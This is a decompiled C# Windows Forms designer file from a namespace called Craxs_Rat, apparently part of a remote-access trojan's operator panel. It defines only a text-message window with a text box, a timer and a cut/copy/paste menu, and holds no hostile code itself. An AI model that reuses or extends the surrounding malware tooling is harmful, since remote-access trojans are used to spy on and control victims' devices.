namespace Craxs_Rat
{
	// Token: 0x02000109 RID: 265
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class TextMessage : global::System.Windows.Forms.Form
	{
		// Token: 0x060012F3 RID: 4851 RVA: 0x000CE0F0 File Offset: 0x000CC2F0
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060012F4 RID: 4852 RVA: 0x000CE134 File Offset: 0x000CC334
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.TextMsg = new global::System.Windows.Forms.RichTextBox();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.CMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.CutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CopyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PasteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CMenu.SuspendLayout();
			base.SuspendLayout();
			this.TextMsg.BackColor = global::System.Drawing.Color.Black;
			this.TextMsg.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.TextMsg.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.TextMsg.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.TextMsg.Location = new global::System.Drawing.Point(0, 0);
			this.TextMsg.Name = "TextMsg";
			this.TextMsg.Size = new global::System.Drawing.Size(414, 241);
			this.TextMsg.TabIndex = 0;
			this.TextMsg.Text = "";
			this.TextMsg.WordWrap = false;
			this.TOpacity.Interval = 1;
			this.CMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.CutToolStripMenuItem,
				this.CopyToolStripMenuItem,
				this.PasteToolStripMenuItem
			});
			this.CMenu.Name = "CMenu";
			this.CMenu.ShowImageMargin = false;
			this.CMenu.Size = new global::System.Drawing.Size(78, 70);
			this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
			this.CutToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.CutToolStripMenuItem.Text = "Cut";
			this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
			this.CopyToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.CopyToolStripMenuItem.Text = "Copy";
			this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
			this.PasteToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.PasteToolStripMenuItem.Text = "Paste";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(414, 241);
			base.Controls.Add(this.TextMsg);
			base.Name = "TextMessage";
			base.Opacity = 0.0;
			this.Text = "TextMessage";
			this.CMenu.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x04000CC3 RID: 3267
		private global::System.ComponentModel.Container components;
	}
}
